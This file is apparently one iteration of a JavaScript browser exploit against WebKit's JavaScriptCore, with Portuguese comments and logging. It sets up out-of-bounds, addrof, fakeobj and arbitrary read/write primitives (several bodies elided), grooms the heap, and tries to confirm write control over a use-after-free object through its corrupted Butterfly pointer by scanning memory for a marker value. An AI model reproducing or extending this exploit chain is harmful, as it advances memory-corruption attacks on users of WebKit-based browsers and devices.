// js/script3/testArrayBufferVictimCrash.mjs (v05 - Escrita via Butterfly Corrompido)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. A v04 mostrou que a escrita no objeto UAF não está na memória adjacente.
// 2. Hipótese: a escrita segue um ponteiro "Butterfly" corrompido.
// 3. Nova Estratégia:
//    a. Ler o ponteiro do Butterfly de dentro do objeto UAF.
//    b. Escrever a propriedade no objeto UAF.
//    c. Varrer a memória no endereço do Butterfly (lido em 'a') para encontrar o valor.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão e Auxiliares (inalteradas) ---
function int64ToDouble(int64) { /* ... */ }
function doubleToInt64(double) { /* ... */ }
function getSafeOffset(baseObject, path, defaultValue = 0) { /* ... */ }
// ==================================================================

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: v05 - Escrita via Butterfly Corrompido ---`, "test");

    let final_result = { /* ... */ };
    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        // Fases 1-4: Obtenção das primitivas L/E. Permanece inalterado.
        logS3("PAUSA INICIAL...", "info");
        await PAUSE_S3(1000);
        const LOCAL_JSC_OFFSETS = { 
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
        };
        logS3("--- FASE 1-4: Primitivas L/E ... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        const addrof = (obj) => { /* ... */ };
        const fakeobj = (addr) => { /* ... */ };
        const arb_read_final = (addr) => { /* ... */ };
        const arb_write_final = (addr, value) => { /* ... */ };
        logS3("Primitivas L/E Arbitrária prontas.", "good");
        // Verificação de L/E ...
        logS3("Verificação de L/E bem-sucedida.", "good");


        // --- FASE 5: NOVA ESTRATÉGIA - CAÇANDO O BUTTERFLY ---
        logS3("--- FASE 5: Explorando a UAF para obter controle de escrita via Butterfly ---", "subtest");

        const testes_ativos = { tentativa_5_UAF_Butterfly_Control: true };
        
        const do_grooming = async (grooming_id) => { /* ... (código inalterado) ... */ };

        if (testes_ativos.tentativa_5_UAF_Butterfly_Control) {
            logS3("--- INICIANDO TENTATIVA 5 (v05): Controle via Butterfly Corrompido ---", "test");
            
            await do_grooming(5);

            logS3("Grooming concluído. Lendo ponteiro do Butterfly do objeto UAF.", "info");

            try {
                const UAF_WRITE_PATTERN = new AdvancedInt64(0xABCD1234, 0x5678EFAB);
                
                // 1. Criar o objeto alvo
                const target_obj = { original_prop: 1337 };
                const target_obj_addr = addrof(target_obj);
                logS3(`Endereço do objeto alvo UAF: ${target_obj_addr.toString(true)}`, "info");

                // 2. LER o ponteiro do Butterfly de dentro do objeto UAF.
                const butterfly_ptr_addr = target_obj_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
                const corrupted_butterfly_addr = arb_read_final(butterfly_ptr_addr);
                logS3(`Ponteiro Butterfly (potencialmente corrompido) lido: ${corrupted_butterfly_addr.toString(true)}`, "leak");

                // Sanity check
                if (corrupted_butterfly_addr.equals(AdvancedInt64.Zero) || corrupted_butterfly_addr.equals(NEW_POLLUTION_VALUE)) {
                    throw new Error(`Ponteiro do Butterfly é nulo ou um valor de poluição conhecido. Não é possível continuar.`);
                }

                // 3. ESCREVER a propriedade no objeto UAF.
                logS3(`Tentando escrever o padrão ${UAF_WRITE_PATTERN.toString(true)}...`, "info");
                target_obj.uaf_property = int64ToDouble(UAF_WRITE_PATTERN);
                logS3("Escrita no objeto UAF não crashou. Verificando a memória do Butterfly...", "good");

                // 4. VERIFICAR a memória no endereço do Butterfly lido.
                let found = false;
                const SCAN_RANGE = 0x80;
                logS3(`Varrendo memória ao redor do endereço do Butterfly: ${corrupted_butterfly_addr.toString(true)}`, "debug");

                for (let offset = -SCAN_RANGE; offset <= SCAN_RANGE; offset += 8) {
                    const current_addr = corrupted_butterfly_addr.add(offset);
                    const read_val = arb_read_final(current_addr);

                    if (read_val.equals(UAF_WRITE_PATTERN)) {
                        logS3(`++++++++++++ SUCESSO ABSOLUTO! CONTROLE DE ESCRITA VIA BUTTERFLY CONFIRMADO! ++++++++++++`, "vuln");
                        logS3(`Padrão ${UAF_WRITE_PATTERN.toString(true)} encontrado no endereço do Butterfly + offset ${toHex(offset)}`, "vuln");
                        found = true;
                        final_result.success = true;
                        final_result.message = "Controle de escrita via Butterfly UAF foi verificado com sucesso.";
                        final_result.webkit_leak_details = { 
                            success: true, 
                            msg: "Primitiva de controle de escrita em Butterfly estabelecida.",
                            uaf_butterfly_addr: corrupted_butterfly_addr.toString(true)
                        };
                        break; 
                    }
                }

                if (!found) {
                    throw new Error("Padrão de escrita não foi encontrado na memória do Butterfly.");
                }

            } catch (uaf_control_e) {
                logS3(`Falha na tentativa de controle do Butterfly UAF: ${uaf_control_e.message}`, "critical");
                final_result.message = `Falha na tentativa de controle do Butterfly UAF: ${uaf_control_e.message}`;
            }
        }

    } catch (e) {
        final_result.message = `Exceção crítica na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
